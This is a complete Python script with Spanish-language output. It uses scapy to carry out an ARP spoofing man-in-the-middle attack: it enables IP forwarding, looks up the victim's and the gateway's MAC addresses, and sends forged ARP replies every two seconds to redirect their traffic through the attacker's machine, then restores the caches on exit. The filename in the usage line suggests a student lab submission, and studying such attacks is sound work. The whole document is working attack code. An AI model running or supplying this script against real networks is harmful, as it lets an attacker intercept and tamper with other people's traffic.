#!/usr/bin/env python3

import sys
import time
import signal
import subprocess
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr

IP_VICTIMA = ""
IP_GATEWAY = ""
MAC_VICTIMA = ""
MAC_GATEWAY = ""
INTERFAZ = ""
paquetes_enviados = 0

def set_ip_forwarding(enable):
    value = "1" if enable else "0"
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"],
                   capture_output=True)
    estado = "ACTIVADO" if enable else "DESACTIVADO"
    print(f"[*] IP Forwarding -> {estado}")

def obtener_mac(ip, interfaz):
    print(f"[*] Resolviendo MAC de {ip} ...")
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=interfaz,
        timeout=2,
        retry=3,
        verbose=False
    )
    if not ans:
        print(f"[!] No se encontro {ip} en la red. Verifica la topologia.")
        sys.exit(1)
    mac = ans[0][1].hwsrc
    print(f"[*] MAC de {ip} -> {mac}")
    return mac

def construir_reply(pdst, psrc, hwdst, hwsrc):
    return Ether(dst=hwdst) / ARP(
        op=2,
        pdst=pdst,
        psrc=psrc,
        hwdst=hwdst,
        hwsrc=hwsrc
    )

def restaurar_arp():
    print("\n[*] Restaurando caches ARP ...")
    for _ in range(5):
        sendp(construir_reply(IP_VICTIMA, IP_GATEWAY, MAC_VICTIMA, MAC_GATEWAY),
              iface=INTERFAZ, verbose=False)
        sendp(construir_reply(IP_GATEWAY, IP_VICTIMA, MAC_GATEWAY, MAC_VICTIMA),
              iface=INTERFAZ, verbose=False)
        time.sleep(0.3)
    print("[+] Caches ARP restauradas.")

def salida_limpia(sig, frame):
    print(f"\n[*] Deteniendo ataque...")
    restaurar_arp()
    set_ip_forwarding(False)
    print(f"[+] Paquetes enviados: {paquetes_enviados}")
    print("[+] Ataque finalizado.")
    sys.exit(0)

def lanzar_ataque(ip_victima, ip_gateway, interfaz):
    global IP_VICTIMA, IP_GATEWAY, MAC_VICTIMA, MAC_GATEWAY, INTERFAZ, paquetes_enviados

    IP_VICTIMA = ip_victima
    IP_GATEWAY = ip_gateway
    INTERFAZ   = interfaz

    mac_kali    = get_if_hwaddr(interfaz)
    MAC_VICTIMA = obtener_mac(ip_victima, interfaz)
    MAC_GATEWAY = obtener_mac(ip_gateway, interfaz)

    set_ip_forwarding(True)

    print(f"[*] Iniciando ARP Spoofing (MitM) en {interfaz}...")
    print(f"[*] Victima: {ip_victima} ({MAC_VICTIMA})")
    print(f"[*] Gateway: {ip_gateway} ({MAC_GATEWAY})")
    print(f"[*] Atacante MAC: {mac_kali}")
    print("[*] Presiona Ctrl+C para detener el ataque.")

    signal.signal(signal.SIGINT, salida_limpia)

    while True:
        sendp(construir_reply(ip_victima, ip_gateway, MAC_VICTIMA, mac_kali),
              iface=interfaz, verbose=False)
        sendp(construir_reply(ip_gateway, ip_victima, MAC_GATEWAY, mac_kali),
              iface=interfaz, verbose=False)

        paquetes_enviados += 2
        print(f"\r[>] Paquetes enviados: {paquetes_enviados}", end="", flush=True)
        time.sleep(2)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: sudo python3 JonathanRondon_20250737_ARP_MitM.py <IP_victima> <IP_gateway> <interfaz>")
        sys.exit(1)

    ip_victima = sys.argv[1]
    ip_gateway = sys.argv[2]
    interfaz   = sys.argv[3]

    lanzar_ataque(ip_victima, ip_gateway, interfaz)
